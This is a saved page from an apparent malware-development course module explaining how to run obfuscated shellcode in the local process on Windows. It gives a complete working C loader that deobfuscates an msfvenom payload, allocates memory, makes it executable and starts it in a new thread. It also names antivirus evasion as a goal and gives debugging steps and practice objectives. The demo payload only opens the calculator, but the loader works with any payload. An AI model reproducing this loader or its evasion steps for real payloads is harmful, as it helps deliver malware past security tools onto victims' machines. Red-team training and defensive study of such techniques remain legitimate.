<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Local%20Payload%20Execution%20-%20Shellcode_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Local%20Payload%20Execution%20-%20Shellcode_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Local%20Payload%20Execution%20-%20Shellcode_files/css2.css" rel="stylesheet">
        <link href="Local%20Payload%20Execution%20-%20Shellcode_files/css2_002.css" rel="stylesheet">
        <title>Local Payload Execution - Shellcode</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Local%20Payload%20Execution%20-%20Shellcode_files/app.fdbb573b.css"><link rel="stylesheet" href="Local%20Payload%20Execution%20-%20Shellcode_files/app.fdbb573b.css"><link rel="stylesheet" href="Local%20Payload%20Execution%20-%20Shellcode_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Local%20Payload%20Execution%20-%20Shellcode_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 27 - Local Payload Execution - Shellcode
            </div>
            <div class="ml-2 w-4 h-4 bg-green-800 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Local%20Payload%20Execution%20-%20Shellcode_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Local%20Payload%20Execution%20-%20Shellcode_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Local%20Payload%20Execution%20-%20Shellcode_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/Local-Shellcode-Exec" target="_blank">
                    <img src="Local%20Payload%20Execution%20-%20Shellcode_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Local Payload Execution - Shellcode</h2>
<h3>Introduction</h3>
<p>This module will discuss one of the simplest ways to execute 
shellcode via the creation of a new thread. Although this technique is 
simple, it's crucial to understand how it works as it lays the 
groundwork for more advanced shellcode execution methods.</p>
<p>The method discussed in this module utilizes <code>VirtualAlloc</code>, <code>VirtualProtect</code> and <code>CreateThread</code>
 Windows APIs. It's important to note that this method is by no means a 
stealthy technique and EDRs will almost certainly detect this simple 
shellcode execution technique. On the other hand, antiviruses can 
potentially be bypassed using this method with sufficient obfuscation.</p>
<h3>Required Windows APIs</h3>
<p>A good starting point would be to have a look at the documentation for the Windows APIs that will be utilized:</p>
<ul>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" target="_blank">VirtualAlloc</a> - Allocates memory which will be used to store the payload</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect" target="_blank">VirtualProtect</a> - Change the memory protection of the allocated memory to be executable in order to execute the payload.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread" target="_blank">CreateThread</a> - Creates a new thread that runs the payloads</p>
</li>
</ul>
<h3>Obfuscating Payload</h3>
<p>The payload used in this module will be the Msfvenom generated x64 
calc payload. To make the demo realistic, evading Defender will be 
attempted and therefore obfuscating or encrypting the payload will be 
necessary. HellShell, which was introduced in an earlier module, will be
 used to obfuscate the payload. Run the following command:</p>
<p><code>HellShell.exe msfvenom.bin uuid</code></p>
<p>The output should be saved to the <code>UuidArray</code> variable.</p>
<h3>Allocating Memory</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" target="_blank">VirtualAlloc</a> is used to allocate memory of size <code>sDeobfuscatedSize</code>. The size of <code>sDeobfuscatedSize</code> is determined by the <code>UuidDeobfuscation</code> function, which returns the total size of the deobfuscated payload.</p>
<p>The <code>VirtualAlloc</code> WinAPI function looks like the following based on its documentation</p>
<pre><code>LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,          // The starting address of the region to allocate (set to NULL)
  [in]           SIZE_T dwSize,             // The size of the region to allocate, in bytes
  [in]           DWORD  flAllocationType,   // The type of memory allocation
  [in]           DWORD  flProtect           // The memory protection for the region of pages to be allocated
);
</code></pre>
<p>The type of memory allocation is specified as <code>MEM_RESERVE | MEM_COMMIT</code>
 which will reserve a range of pages in the virtual address space of the
 calling process and commit physical memory to those reserved pages, the
 combined flags are discussed separately as the following:</p>
<ul>
<li>
<p><code>MEM_RESERVE</code> is used to reserve a range of pages without actually committing physical memory.</p>
</li>
<li>
<p><code>MEM_COMMIT</code> is used to commit a range of pages in the virtual address space of the process.</p>
</li>
</ul>
<p>The last parameter of <code>VirtualAlloc</code> sets the permissions on the memory region. The easiest way would be to set the memory protection to <code>PAGE_EXECUTE_READWRITE</code>
 but that is generally an indicator of malicious activity for many 
security solutions. Therefore the memory protection is set to <code>PAGE_READWRITE</code> since at this point only writing the payload is required but executing it isn't. Finally, <code>VirtualAlloc</code> will return the base address of the allocated memory.</p>
<h3>Writing Payload To Memory</h3>
<p>Next, the deobfuscated payload bytes are copied into the newly allocated memory region at <code>pShellcodeAddress</code> and then clean up <code>pDeobfuscatedPayload</code> by overwriting it with 0s. <code>pDeobfuscatedPayload</code> is the base address of a heap allocated by the <code>UuidDeobfuscation</code>
 function which returns the raw shellcode bytes. It has been overridden 
with zeroes since it is not required anymore and therefore this will 
reduce the possibility of security solutions finding the payload in 
memory.</p>
<h3>Modifying Memory Protection</h3>
<p>Before the payload can be executed, the memory protection must be changed since at the moment only read/write is permitted. <code>VirtualProtect</code> is used to modify the memory protections and for the payload to execute it will need either <code>PAGE_EXECUTE_READ</code> or <code>PAGE_EXECUTE_READWRITE</code>.</p>
<p>The <code>VirtualProtect</code> WinAPI function looks like the following based on its documentation</p>
<pre><code>BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       // The base address of the memory region whose access protection is to be changed
  [in]  SIZE_T dwSize,          // The size of the region whose access protection attributes are to be changed, in bytes
  [in]  DWORD  flNewProtect,    // The new memory protection option
  [out] PDWORD lpflOldProtect   // Pointer to a 'DWORD' variable that receives the previous access protection value of 'lpAddress'
);
</code></pre>
<p>Although some shellcode does require <code>PAGE_EXECUTE_READWRITE</code>,
 such as self-decrypting shellcode, the Msfvenom x64 calc shellcode does
 not need it but the code snippet below uses that memory protection.</p>
<h3>Payload Execution Via CreateThread</h3>
<p>Finally, the payload is executed by creating a new thread using the <code>CreateThread</code> Windows API function and passing <code>pShellcodeAddress</code> which is the shellcode address.</p>
<p>The <code>CreateThread</code> WinAPI function looks like the following based on its documentation</p>
<pre><code>HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,    // Set to NULL - optional
  [in]            SIZE_T                  dwStackSize,           // Set to 0 - default
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,        // Pointer to a function to be executed by the thread, in our case its the base address of the payload
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,           // Pointer to a variable to be passed to the function executed (set to NULL - optional)
  [in]            DWORD                   dwCreationFlags,       // Set to 0 - default
  [out, optional] LPDWORD                 lpThreadId             // pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)   
);
</code></pre>
<h3>Payload Execution Via Function Pointer</h3>
<p>Alternatively, there is a simpler way to run the shellcode without using the <code>CreateThread</code> Windows API. In the example below, the shellcode is casted to a <code>VOID</code> function pointer and the shellcode is executed as a function pointer. The code essentially jumps to the <code>pShellcodeAddress</code> address.</p>
<pre><code>    (*(VOID(*)()) pShellcodeAddress)();
</code></pre>
<p>That is equivalent to running the code below.</p>
<pre><code>    typedef VOID (WINAPI* fnShellcodefunc)();       // Defined before the main function
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
    pShell();
</code></pre>
<h3>CreateThread vs Function Pointer Execution</h3>
<p>Although it is possible to execute shellcode using the function 
pointer method, it's generally not recommended. The Msfvenom-generated 
shellcode terminates the calling thread after it's done executing. If 
the shellcode was executed using the function pointer method, then the 
calling thread will be the main thread and therefore the entire process 
will exit after the shellcode is finished executing.</p>
<p>Executing the shellcode in a new thread prevents this problem because
 if the shellcode is done executing, the new worker thread will be 
terminated rather than the main thread, preventing the whole process 
from termination.</p>
<h3>Waiting For Thread Execution</h3>
<p>Executing the shellcode using a new thread without a short delay 
increases the likelihood of the main thread finishing execution before 
the worker thread that runs the shellcode has completed its execution, 
leading to the shellcode not running correctly. This scenario is 
illustrated in the code snippet below.</p>
<pre><code>int main(){
    
    // ...
    
    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // Shellcode execution
    return 0; // The main thread is done executing before the thread running the shellcode
}
</code></pre>
<p>In the provided implementation, <code>getchar()</code> is used to 
pause the execution until the user provides input. In real 
implementations, a different approach should be used which utilizes the <a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank">WaitForSingleObject</a> WinAPI to wait for a specified time until the thread executes.</p>
<p>The snippet below uses <code>WaitForSingleObject</code> to wait for the newly created thread to finish executing for <code>2000</code> milliseconds before executing the remaining code.</p>
<pre><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, 2000);

// Remaining code

</code></pre>
<p>In the example below, <code>WaitForSingleObject</code> will wait forever for the new thread to finish executing.</p>
<pre><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINTE);

</code></pre>
<h3>Main Function</h3>
<p>The main function uses <code>UuidDeobfuscation</code> to deobfuscate the payload, then allocates memory, copies the shellcode to the memory region and executes it.</p>
<pre><code>int main() {

    PBYTE       pDeobfuscatedPayload  = NULL;
    SIZE_T      sDeobfuscatedSize     = NULL;

    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());
    printf("[#] Press &lt;Enter&gt; To Decrypt ... ");
    getchar();

    printf("[i] Decrypting ...");
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &amp;pDeobfuscatedPayload, &amp;sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");
    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press &lt;Enter&gt; To Allocate ... ");
    getchar();
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press &lt;Enter&gt; To Write Payload ... ");
    getchar();
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);


    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press &lt;Enter&gt; To Run ... ");
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] Press &lt;Enter&gt; To Quit ... ");
    getchar();
    return 0;
}
</code></pre>
<h3>Deallocating Memory</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree" target="_blank">VirtualFree</a>
 is a WinAPI that is used to deallocate previously allocated memory. 
This function should only be called after the payload has fully finished
 execution otherwise it might free the payload's content and crash the 
process.</p>
<pre><code>BOOL VirtualFree(
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);
</code></pre>
<p><code>VirtualFree</code> takes the base address of the allocated memory to be freed (<code>lpAddress</code>), the size of the memory to free (<code>dwSize</code>) and the type of free operation (<code>dwFreeType</code>) which can be one of the following flags:</p>
<ul>
<li>
<p><code>MEM_DECOMMIT</code> - The <code>VirtualFree</code> call will 
release the physical memory without releasing the virtual address space 
that is linked to it. As a result, the virtual address space can still 
be used to allocate memory in the future, but the pages linked to it are
 no longer supported by physical memory.</p>
</li>
<li>
<p><code>MEM_RELEASE</code> - Both the virtual address space and the 
physical memory associated with the virtual memory allocated, are freed.
 Note that according to Microsoft's documentation, when this flag is 
used the <code>dwSize</code> parameter must be 0.</p>
</li>
</ul>
<h3>Debugging</h3>
<p>In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.</p>
<p>First, verify the output of the <code>UuidDeobfuscation</code> 
function to ensure valid shellcode is being returned. The image below 
shows that the shellcode is being deobfuscated successfully.</p>
<p><img src="Local%20Payload%20Execution%20-%20Shellcode_files/local-shellcode-injection-1.png" alt="image"></p>
<br>
<p>The next step is to check that memory is being allocated using the <code>VirtualAlloc</code>
 Windows API. Again, looking at the memory map at the bottom left it 
shows that memory is allocated and was populated with zeroes.</p>
<p><img src="Local%20Payload%20Execution%20-%20Shellcode_files/local-shellcode-injection-2.png" alt="image"></p>
<br>
<p>After the memory was successfully allocated, the deobfuscated payload is written to the memory buffer.</p>
<p><img src="Local%20Payload%20Execution%20-%20Shellcode_files/local-shellcode-injection-3.png" alt="image"></p>
<br>
<p>Recall that <code>pDeobfuscatedPayload</code> was zeroed out to avoid
 having the deobfuscated payload in memory where it's not being used. 
The buffer should be zeroed out completely.</p>
<p><img src="Local%20Payload%20Execution%20-%20Shellcode_files/local-shellcode-injection-4.png" alt="image"></p>
<br>
<p>Finally, the shellcode is executed and as expected the calculator application appears.</p>
<p><img src="Local%20Payload%20Execution%20-%20Shellcode_files/local-shellcode-injection-5.png" alt="image"></p>
<br>
<p>The shellcode can be seen inside Process Hacker's memory tab. Notice how our allocated memory region has <code>RWX</code> memory protection which stands out and therefore is usually a malicious indicator.</p>
<p><img src="Local%20Payload%20Execution%20-%20Shellcode_files/local-shellcode-injection-6.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Compile and run the provided code to perform local shellcode execution on your obfuscated shellcode</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Execute the shellcode without using the CreateThread WinAPI.</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Execute the shellcode using CreateThread</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-3" data-objective-id="3" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Compare the difference between the two different execution methods</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/26"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/27/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/27/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/28"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Local%20Payload%20Execution%20-%20Shellcode_files/jquery-3.6.0.min.js"></script>
        <script src="Local%20Payload%20Execution%20-%20Shellcode_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Local%20Payload%20Execution%20-%20Shellcode_files/app.4474f4d1.css"><link rel="modulepreload" href="Local%20Payload%20Execution%20-%20Shellcode_files/app.5f3af5ce.js"><link rel="stylesheet" href="Local%20Payload%20Execution%20-%20Shellcode_files/app.4474f4d1.css"><script type="module" src="Local%20Payload%20Execution%20-%20Shellcode_files/app.5f3af5ce.js"></script><script src="Local%20Payload%20Execution%20-%20Shellcode_files/navbar.js"></script>
<script src="Local%20Payload%20Execution%20-%20Shellcode_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 27;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>